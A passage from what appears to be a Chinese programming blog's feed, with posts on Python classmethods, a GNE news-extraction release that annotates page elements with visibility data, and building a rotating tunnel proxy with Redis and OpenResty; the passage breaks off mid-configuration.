class="keyword">def</span> <span class="title">from_english_string</span><span class="params">(cls, sentence)</span>:</span></span><br><span class="line">        name = re.search(<span class="string">'name: (.*?),'</span>, content).group(<span class="number">1</span>)</span><br><span class="line">        age = re.search(<span class="string">'age: (\d+)'</span>, content).group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> cls(name, age)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">calc_age_after_n_year</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        age = People.add_two_string_num(self.age, n)</span><br><span class="line">        print(<span class="string">f'<span class="subst">&#123;n&#125;</span>年以后，我<span class="subst">&#123;age&#125;</span>岁'</span>)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">content = <span class="string">'my name: kinganme, my age: 15 please extract them'</span></span><br><span class="line">kingname = People.from_english_string(content)</span><br><span class="line">kingname.introduce_myself()</span><br><span class="line">kingname.calc_age_after_n_year(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211008190831.png" alt></p><blockquote><p>一句话总结：当你想使用工厂模式，根据不同的参数生成同一个类的不同对象的时候，就可以使用类方法。</p></blockquote><p>其实如果大家使用过Python自带的<code>datetime</code>模块，你就会发现类方法无处不在：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">dt0 = datetime.datetime(<span class="number">2021</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">19</span>, <span class="number">10</span>, <span class="number">5</span>)</span><br><span class="line">now = datetime.datetime.now()</span><br><span class="line">dt = datetime.datetime.fromtimestamp(<span class="number">1633691412</span>)</span><br><span class="line">dt2 = datetime.datetime.fromisoformat(<span class="string">'2021-10-08 19:10:05'</span>)</span><br></pre></td></tr></table></figure><p>这段代码里面的<code>.now()</code>、<code>.fromtimestamp()</code>和 <code>.fromisoformat()</code>，都是类方法。他们最终返回的都是<code>datetime.datetime</code>对象。但是他们是根据不同类型的输入参数生成的。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/640.gif" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有同学在知识星球上问我，什么情况下使用静态方法，什么情况下使用类方法。今天我们就来捋一下这两个方法的应用场景。&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://www.kingname.info/categories/Python/"/>
    
    
      <category term="Python" scheme="https://www.kingname.info/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>GNE 版本升级，基于可视化信号自动化识别并提取新闻正文</title>
    <link href="https://www.kingname.info/2021/10/07/gne-0-3-0/"/>
    <id>https://www.kingname.info/2021/10/07/gne-0-3-0/</id>
    <published>2021-10-07T08:18:23.000Z</published>
    <updated>2021-10-07T08:22:29.717Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-07-16-05-00.png" alt></p><p>GNE 是一个通用的新闻正文抽取器，自从开源以来，已经被很多人用来作为新闻正文通用爬虫的重要组件。</p><p>GNE 的 Github 地址：<a href="https://github.com/GeneralNewsExtractor/GeneralNewsExtractor" target="_blank" rel="noopener">https://github.com/GeneralNewsExtractor/GeneralNewsExtractor</a>。算法来自于<a href="https://kns.cnki.net/KCMS/detail/detail.aspx?dbcode=CJFQ&amp;dbname=CJFDLAST2019&amp;filename=GWDZ201908029&amp;v=MDY4MTRxVHJXTTFGckNVUkxPZmJ1Wm5GQ2poVXJyQklqclBkTEc0SDlqTXA0OUhiWVI4ZVgxTHV4WVM3RGgxVDM=" target="_blank" rel="noopener">《基于文本及符号密度的网页正文提取方法》</a>，这个算法是完全基于 HTML 里面的信息来寻找正文。因此，它有一些先天性缺陷：</p><ol><li>如果正文只有三五句话，但评论是长篇大论，提取就会失败</li><li>如果正文里面 html 标签太多，也会导致正文找错位置</li><li>经常提取到版权信息</li></ol><p>但如果让人来看网页，就不会搞错。因为正文的位置和评论的位置肯定不一样，版权信息一般在最下面……这些可视化信号，是通过 CSS 来确定的，单纯从 HTML 中是看不到的。</p><p>GNE 输入的HTML，原本就是使用模拟浏览器输出的 HTML，并不是真正的网页源代码。既然如此，在使用模拟浏览器的时候，为什么不直接把每个节点的坐标信息都记录下来呢？在使用模拟浏览器的时候，只需要执行一段 JavaScript 代码，就可以把每个节点是否可见，每个可见节点的长宽高、左上角、右下角的坐标记录下来。这样，GNE 在解析正文的时候，可以参考这些信息，直接移除不可见的节点，并移除尺寸显然不合理、位置显然不正确的节点。从而大大提高正文识别的准确率。</p><a id="more"></a><p>基于可视化信号的提取效果如何呢？我们用一篇新闻来作为例子：<a href="https://www.163.com/dy/article/G33O1QTA05372UZS.html" target="_blank" rel="noopener">广西省发生了一起事件，位置在来宾市，画面曝光</a>。</p><p>首先在浏览器的开发者工具里面，直接复制经过js 渲染后的源代码：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-07-15-44-28.png" alt></p><p>当我们直接使用 GNE识别正文的时候，运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-07-15-46-34.png" alt></p><p>可以看到，提取到的信息是版权信息。</p><p>现在，如果使用经过修改的 HTML 代码，就能成功提取到正文，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-07-15-47-43.png" alt></p><p>那么，这个经过修改的 HTML 有什么特别呢？我们来看看它长什么样：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-07-15-48-39.png" alt></p><p>在<code>body</code> 标签下面的所有节点，都有一个属性叫做 <code>is_visiable</code> ，它的值是字符串的 <code>true</code> 或者 <code>false</code> 。如果值为 <code>true</code> ,<br>那么，还有一个属性叫做 <code>coordinate</code> 。它的值是一个 JSON 字符串，包含了这个节点的尺寸，坐标等信息。</p><p>那么，这些特殊的 HTML 是怎么生成的呢？如果你只是想做一个临时测试，那么其实只需要在Chrome 的开发者工具的<code>Console(控制台)</code>标签页执行这样一段 js 代码就可以了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_visiability_info</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_body</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> body = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> body</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">insert_info</span>(<span class="params">element</span>) </span>&#123;</span><br><span class="line">        is_visiable = element.offsetParent !== <span class="literal">null</span></span><br><span class="line">        element.setAttribute(<span class="string">'is_visiable'</span>, is_visiable)</span><br><span class="line">        <span class="keyword">if</span> (is_visiable) &#123;</span><br><span class="line">            react = element.getBoundingClientRect()</span><br><span class="line">            coordinate = <span class="built_in">JSON</span>.stringify(react)</span><br><span class="line">            element.setAttribute(<span class="string">'coordinate'</span>, coordinate)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">iter_node</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">        children = node.children</span><br><span class="line">        insert_info(node)</span><br><span class="line">        <span class="keyword">if</span> (children.length !== <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">const</span> element <span class="keyword">of</span> children) &#123;</span><br><span class="line">                iter_node(element)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sizes</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> contentWidth = [...document.body.children].reduce( </span><br><span class="line">          (a, el) =&gt; <span class="built_in">Math</span>.max(a, el.getBoundingClientRect().right), <span class="number">0</span>) </span><br><span class="line">          - <span class="built_in">document</span>.body.getBoundingClientRect().x;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          windowWidth:  <span class="built_in">document</span>.documentElement.clientWidth,</span><br><span class="line">          windowHeight: <span class="built_in">document</span>.documentElement.clientHeight,</span><br><span class="line">          pageWidth:    <span class="built_in">Math</span>.min(<span class="built_in">document</span>.body.scrollWidth, contentWidth),</span><br><span class="line">          pageHeight:   <span class="built_in">document</span>.body.scrollHeight,</span><br><span class="line">          screenWidth:  <span class="built_in">window</span>.screen.width,</span><br><span class="line">          screenHeight: <span class="built_in">window</span>.screen.height,</span><br><span class="line">          pageX:        <span class="built_in">document</span>.body.getBoundingClientRect().x,</span><br><span class="line">          pageY:        <span class="built_in">document</span>.body.getBoundingClientRect().y,</span><br><span class="line">          screenX:     -<span class="built_in">window</span>.screenX,</span><br><span class="line">          screenY:     -<span class="built_in">window</span>.screenY - (<span class="built_in">window</span>.outerHeight-<span class="built_in">window</span>.innerHeight),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">insert_page_info</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        page_info = sizes()</span><br><span class="line">        node = <span class="built_in">document</span>.createElement(<span class="string">'meta'</span>)</span><br><span class="line">        node.setAttribute(<span class="string">'name'</span>, <span class="string">'page_visiability_info'</span>)</span><br><span class="line">        node.setAttribute(<span class="string">'page_info'</span>, <span class="built_in">JSON</span>.stringify(page_info))</span><br><span class="line">        <span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>].appendChild(node)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    insert_page_info()</span><br><span class="line">    body = get_body()</span><br><span class="line">    iter_node(body)</span><br><span class="line">&#125;</span><br><span class="line">insert_visiability_info()</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-07-15-53-51.png" alt></p><p>执行完成以后，重新打开<code>Elements(元素)</code>标签页，就可以看到我们需要的属性已经添加到了各个节点里面。</p><p>如果你想要使用 Puppeteer 或者 Selenium 来实现同样爬虫，想批量自动化执行 JavaScript，我给出一个 Demo，大家可以参考：<a href="https://github.com/GeneralNewsExtractor/GneRender" target="_blank" rel="noopener">GitHub - GeneralNewsExtractor/GneRender: Render web page to add necessary info on every dom element.</a>.</p><p>只需要执行如下几个命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yarn install</span><br><span class="line">node render.js</span><br></pre></td></tr></table></figure><p>就可以在当前文件夹下面生成一个<code>test.html</code>，就这是经过修改的特殊 HTML 了。</p><p>最新版本的 GNE 已经提交到了 Pypi，大家现在可以直接试用 pip 安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install gne</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-07-16-05-00.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;GNE 是一个通用的新闻正文抽取器，自从开源以来，已经被很多人用来作为新闻正文通用爬虫的重要组件。&lt;/p&gt;
&lt;p&gt;GNE 的 Github 地址：&lt;a href=&quot;https://github.com/GeneralNewsExtractor/GeneralNewsExtractor&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/GeneralNewsExtractor/GeneralNewsExtractor&lt;/a&gt;。算法来自于&lt;a href=&quot;https://kns.cnki.net/KCMS/detail/detail.aspx?dbcode=CJFQ&amp;amp;dbname=CJFDLAST2019&amp;amp;filename=GWDZ201908029&amp;amp;v=MDY4MTRxVHJXTTFGckNVUkxPZmJ1Wm5GQ2poVXJyQklqclBkTEc0SDlqTXA0OUhiWVI4ZVgxTHV4WVM3RGgxVDM=&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;《基于文本及符号密度的网页正文提取方法》&lt;/a&gt;，这个算法是完全基于 HTML 里面的信息来寻找正文。因此，它有一些先天性缺陷：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果正文只有三五句话，但评论是长篇大论，提取就会失败&lt;/li&gt;
&lt;li&gt;如果正文里面 html 标签太多，也会导致正文找错位置&lt;/li&gt;
&lt;li&gt;经常提取到版权信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;但如果让人来看网页，就不会搞错。因为正文的位置和评论的位置肯定不一样，版权信息一般在最下面……这些可视化信号，是通过 CSS 来确定的，单纯从 HTML 中是看不到的。&lt;/p&gt;
&lt;p&gt;GNE 输入的HTML，原本就是使用模拟浏览器输出的 HTML，并不是真正的网页源代码。既然如此，在使用模拟浏览器的时候，为什么不直接把每个节点的坐标信息都记录下来呢？在使用模拟浏览器的时候，只需要执行一段 JavaScript 代码，就可以把每个节点是否可见，每个可见节点的长宽高、左上角、右下角的坐标记录下来。这样，GNE 在解析正文的时候，可以参考这些信息，直接移除不可见的节点，并移除尺寸显然不合理、位置显然不正确的节点。从而大大提高正文识别的准确率。&lt;/p&gt;
    
    </summary>
    
      <category term="GNE" scheme="https://www.kingname.info/categories/GNE/"/>
    
    
      <category term="GNE" scheme="https://www.kingname.info/tags/GNE/"/>
    
      <category term="通用爬虫" scheme="https://www.kingname.info/tags/%E9%80%9A%E7%94%A8%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>只要5分钟，创建一个隧道代理</title>
    <link href="https://www.kingname.info/2021/07/24/build-tunnel-proxy/"/>
    <id>https://www.kingname.info/2021/07/24/build-tunnel-proxy/</id>
    <published>2021-07-24T00:54:53.000Z</published>
    <updated>2021-07-24T00:56:46.528Z</updated>
    
    <content type="html"><![CDATA[<p>什么是隧道代理？我们来看下面这张截图：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-08-41-21.png" alt></p><p>所谓隧道代理，就是一个能帮你自动更换代理 IP 的代理服务。在你的代码里面，你只需要把一个入口代理地址写死，然后正常发起请求，而目标服务器接收到的请求，每一次都是不同的代理地址。</p><p>在某代理网站上，隧道代理50并发每秒的价格是4000元/月：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-08-47-07.png" alt></p><p>而常规的，先请求接口拿到一批代理 IP，再选一个发起请求的原始代理服务器，一个月价格才600多元：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-08-49-41.png" alt></p><p>所以，如果我们能自己做一个隧道代理，将会省下很多钱！</p><a id="more"></a><p>隧道代理的原理，跟常规代理的不同之处，用下面这两张图就能说清楚：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-21-08-36.png" alt="传统代理服务"></p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-21-11-06.png" alt="隧道代理"></p><p>要自己开发一个这样的隧道代理，我们需要做两步：</p><ol><li>构建一个代理池</li><li>实现代理自动转发</li></ol><h2 id="构建代理池"><a href="#构建代理池" class="headerlink" title="构建代理池"></a>构建代理池</h2><p>假设你从代理供应商手上买到的便宜代理地址为：<code>http://xxx.com/ips</code>，直接在浏览器上面请求，页面效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20210723163643.png" alt></p><p>现在，你需要做的就是写一个程序，周期性访问这个url，拉取当前最新可用的IP地址，然后把它放到Redis中。</p><p>这里，我们使用Redis的Hash这个数据结构，其中Hash的字段名就是<code>IP:端口</code>，里面的值就是跟每个IP相关的一些信息。</p><p>你这个程序需要确保，当前在Redis里面的代理地址，全部都是可用的。这里，我给出了一个示例程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">ProxyManager.py</span></span><br><span class="line"><span class="string">~~~~~~~~~~~~~~~~~~~~~</span></span><br><span class="line"><span class="string">简易代理池管理工具，直接从URL中读取所有</span></span><br><span class="line"><span class="string">最新的代理，并写入Redis。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyManager</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.config = self.read_config()</span><br><span class="line">        self.redis_config = self.config[<span class="string">'redis'</span>]</span><br><span class="line">        self.client = redis.Redis(host=self.redis_config[<span class="string">'host'</span>],</span><br><span class="line">                                  password=self.redis_config[<span class="string">'password'</span>],</span><br><span class="line">                                  port=self.redis_config[<span class="string">'port'</span>])</span><br><span class="line">        self.instance_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_config</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'config.yaml'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            config = yaml.safe_load(f.read())</span><br><span class="line">            <span class="keyword">return</span> config</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_ip</span><span class="params">(self)</span>:</span></span><br><span class="line">        resp = requests.get(self.config[<span class="string">'proxy'</span>]).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'&#123;'</span> <span class="keyword">in</span> resp:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        proxy_list = resp.split()</span><br><span class="line">        <span class="keyword">return</span> proxy_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">delete_ip</span><span class="params">(self, live_ips, pool_ips)</span>:</span></span><br><span class="line">        ip_to_removed = set(pool_ips) - set(live_ips)</span><br><span class="line">        <span class="keyword">if</span> ip_to_removed:</span><br><span class="line">            print(<span class="string">'ip to be removed:'</span>, ip_to_removed)</span><br><span class="line">            self.client.hdel(self.redis_config[<span class="string">'key'</span>], *list(ip_to_removed))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_new_ips</span><span class="params">(self, live_ips, pool_ips)</span>:</span></span><br><span class="line">        ip_to_add = set(live_ips) - set(pool_ips)</span><br><span class="line">        <span class="keyword">if</span> ip_to_add:</span><br><span class="line">            print(<span class="string">'ip to add:'</span>, ip_to_add)</span><br><span class="line">            ips = &#123;&#125;</span><br><span class="line">            <span class="keyword">for</span> ip <span class="keyword">in</span> ip_to_add:</span><br><span class="line">                ips[ip] = json.dumps(&#123;<span class="string">'private_ip'</span>: ip,</span><br><span class="line">                                      <span class="string">'ts'</span>: datetime.datetime.now().strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>)&#125;)</span><br><span class="line">            self.client.hset(self.redis_config[<span class="string">'key'</span>], mapping=ips)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            live_ips = self.read_ip()</span><br><span class="line">            pool_ips = [x.decode() <span class="keyword">for</span> x <span class="keyword">in</span> self.client.hgetall(self.redis_config[<span class="string">'key'</span>])]</span><br><span class="line">            self.delete_ip(live_ips, pool_ips)</span><br><span class="line">            self.add_new_ips(live_ips, pool_ips)</span><br><span class="line">            time.sleep(<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    manager = ProxyManager()</span><br><span class="line">    manager.run()</span><br></pre></td></tr></table></figure><p>其中，我把Redis相关的配置、代理供应商的URL写到了一个yaml配置文件中，防止被你们看到。配置文件的格式如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-21-13-08.png" alt></p><p>由于我这个代理供应商提供的IP，有效期是1-5分钟，所以保险起见，我每40秒更换一次IP。更换的时候，采用了增量更换的方式。把当前拉取的IP和Redis里面的已有IP进行对比。不在这次拉取的IP全部从Redis移除，然后把新增的IP加到Redis中。</p><p>大家在实际过程中，还可以加一些代理校验的逻辑，确保从URL拉下来的代理也进行有效性检查，发现无效的立刻移除。</p><h2 id="实现自动转发"><a href="#实现自动转发" class="headerlink" title="实现自动转发"></a>实现自动转发</h2><p>要实现自动转发，我们可以使用<a href="https://openresty.org/cn/" target="_blank" rel="noopener">OpenResty</a>。这是一个基于Nginx和Lua实现的高性能Web平台。通过它，我们可以使用Lua语言实现一些逻辑，例如从Redis读取数据，把来源请求转发到上游代理服务器……</p><p>因此，我们使用OpenResty搭建一个转发服务。并把这个转发服务所在服务器的IP地址作为我们的入口IP地址。在使用Requests等等网络请求客户端发送请求的时候，只需要把这个入口IP地址设置为代理。那么，当客户端发送请求的时候，请求首先到了OpenResty。然后它从Redis中随机选一个代理IP来作为上游代理，并把刚刚发来的请求转发到上游代理。从而实现隧道代理的效果。</p><p>Lua是一门非常老的语言，它的语法不少地方跟Python不太一样。不过你不用担心，这个配置文件我已经写好了。大家拿过来改一改就能用。</p><p>对应的配置文件如下图所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">worker_processes  16;        #nginx worker 数量</span><br><span class="line">error_log /usr/local/openresty/nginx/logs/error.log;   #指定错误日志文件路径</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections 1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stream &#123;</span><br><span class="line">    ## TCP 代理日志格式定义</span><br><span class="line">    log_format tcp_proxy &apos;$remote_addr [$time_local] &apos;</span><br><span class="line">                         &apos;$protocol $status $bytes_sent $bytes_received &apos;</span><br><span class="line">                         &apos;$session_time &quot;$upstream_addr&quot; &apos;</span><br><span class="line">                         &apos;&quot;$upstream_bytes_sent&quot; &quot;$upstream_bytes_received&quot; &quot;$upstream_connect_time&quot;&apos;;</span><br><span class="line">    ## TCP 代理日志配置</span><br><span class="line">    access_log /usr/local/openresty/nginx/logs/access.log tcp_proxy;</span><br><span class="line">    open_log_file_cache off;</span><br><span class="line"></span><br><span class="line">    ## TCP 代理配置</span><br><span class="line">    upstream backend&#123;</span><br><span class="line">        server 127.0.0.2:1101;# 爱写啥写啥  反正下面的代码也给你改了</span><br><span class="line">        balancer_by_lua_block &#123;</span><br><span class="line">            -- 初始化balancer</span><br><span class="line">            local balancer = require &quot;ngx.balancer&quot;</span><br><span class="line">            local host = &quot;&quot;</span><br><span class="line">            local port = 0</span><br><span class="line">            host = ngx.ctx.proxy_host</span><br><span class="line">            port = ngx.ctx.proxy_port</span><br><span class="line">            -- 设置 balancer</span><br><span class="line">            local ok, err = balancer.set_current_peer(host, port)</span><br><span class="line">            if not ok then</span><br><span class="line">                ngx.log(ngx.ERR, &quot;failed to set the peer: &quot;, err)</span><br><span class="line">            end</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        preread_by_lua_block&#123;</span><br><span class="line"></span><br><span class="line">            local redis = require(&quot;resty.redis&quot;)</span><br><span class="line">            --创建实例</span><br><span class="line">            local redis_instance = redis:new()</span><br><span class="line">            --设置超时（毫秒）</span><br><span class="line">            redis_instance:set_timeout(3000)</span><br><span class="line">            --建立连接，请在这里配置Redis 的 IP 地址、端口号、密码和用到的 Key</span><br><span class="line">            local rhost = &quot;123.45.67.89&quot;</span><br><span class="line">            local rport = 6739</span><br><span class="line">            local rpass = &quot;abcdefg&quot;</span><br><span class="line">            local rkey = &quot;proxy:pool&quot;</span><br><span class="line">            local ok, err = redis_instance:connect(rhost, rport)</span><br><span class="line">            ngx.log(ngx.ERR, &quot;1111111 &quot;, ok, &quot; &quot;, err)</span><br><span class="line"></span><br><span class="line">            -- 如果没有密码，移除下面这一行</span><br><span class="line">            local res, err = redis_instance:auth(rpass)</span><br><span class="line">            local res, err = redis_instance:hkeys(rkey)</span><br><span class="line">            if not res then</span><br><span class="line">                ngx.log(ngx.ERR,&quot;res num error : &quot;, err)</span><br><span class="line">                return redis_instance:close()</span><br><span class="line">            end</span><br><span class="line">            math.randomseed(tostring(ngx.now()):reverse():sub(1, 6))</span><br><span class="line">            local proxy = res[math.random(#res)]</span><br><span class="line">            local colon_index = string.find(proxy, &quot;:&quot;)</span><br><span class="line">            local proxy_ip = string.sub(proxy, 1, colon_index - 1)</span><br><span class="line">            local proxy_port = string.sub(proxy, colon_index + 1)</span><br><span class="line">            